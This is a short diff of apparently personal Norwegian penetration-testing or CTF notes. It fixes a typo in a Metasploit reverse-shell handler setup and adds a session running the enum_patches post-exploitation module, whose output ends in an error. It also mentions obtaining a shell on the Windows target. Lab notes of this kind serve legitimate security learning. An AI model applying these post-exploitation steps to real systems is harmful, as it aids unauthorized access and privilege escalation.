@@ -33,7 +33,7 @@ fikk et skikkelig shell med [https://www.darknet.org.uk/2014/12/insomniashell-as
 
 
 ```
-* use mutli/handler
+* use multi/handler
 
 * set LHOST attack-machine
 
@@ -106,7 +106,24 @@ wmic qfe get
 
 no work :(
 
-sjekke hvilke 
+sjekke hvilke prossesser som kjører med admin privelege.
+
+
+
+```
+use post/windows/gather/enum_patches    
+```
+msf post(shell_to_meterpreter) > use post/windows/gather/enum_patches
+msf post(enum_patches) > set session 2
+session => 2
+msf post(enum_patches) > exploit
+
+[-] Post failed: NoMethodError undefined method `[]' for nil:NilClass
+[-] Call stack:
+[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_patches.rb:72:in `run'
+[*] Post module execution completed
+
+
 
 
 
